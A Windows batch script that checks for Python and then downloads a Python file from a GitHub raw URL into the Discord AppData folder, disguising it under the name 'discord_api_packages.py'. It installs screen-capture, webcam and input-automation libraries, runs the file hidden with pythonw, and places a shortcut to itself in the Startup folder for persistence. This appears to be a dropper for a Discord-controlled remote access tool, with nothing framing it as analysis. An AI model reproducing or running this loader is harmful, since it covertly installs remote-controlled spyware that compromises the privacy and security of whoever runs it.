@echo off
REM Check if Python is installed
where python >nul 2>nul
if %errorlevel% neq 0 (
    echo Python is not installed. Please install Python and add it to your system PATH.
    pause
    exit /b 1
)

REM Check if pip is installed
where pip >nul 2>nul
if %errorlevel% neq 0 (
    echo pip is not installed. Please install pip and add it to your system PATH.
    pause
    exit /b 1
)

REM Define the path to the Python script
set PYTHON_SCRIPT_PATH="C:\Users\%USERNAME%\AppData\Local\Discord\discord_api_packages.py"

REM Check if the Python script exists, and if so, delete it
if exist %PYTHON_SCRIPT_PATH% (
    del /F %PYTHON_SCRIPT_PATH%
)

REM Download the Python script to the Discord folder
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/iiMAtEAs/bot/refs/heads/main/discord_api_packages.py -OutFile '%PYTHON_SCRIPT_PATH%'"

REM Check if the download was successful
if not exist %PYTHON_SCRIPT_PATH% (
    echo Failed to download discord_api_packages.py. Please check your internet connection and try again.
    pause
    exit /b 1
)

REM Install required Python packages
pip install discord.py
pip install cryptography
pip install requests
pip install opencv-python
pip install numpy
pip install pillow
pip install pygetwindow
pip install pyautogui

REM Run the Python bot script using pythonw to keep it hidden
start /B pythonw.exe %PYTHON_SCRIPT_PATH%

REM Check if the Python script ran successfully
if %errorlevel% neq 0 (
    echo Failed to run discord_api_packages.py. Please check the script for errors.
    pause
    exit /b 1
)

REM Add the batch script to the startup folder with a hidden shortcut
set SCRIPT_PATH=%~f0
set SHORTCUT_PATH=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%~n0.lnk
powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%SHORTCUT_PATH%'); $s.TargetPath = '%SCRIPT_PATH%'; $s.WindowStyle = 1; $s.Save()"

exit
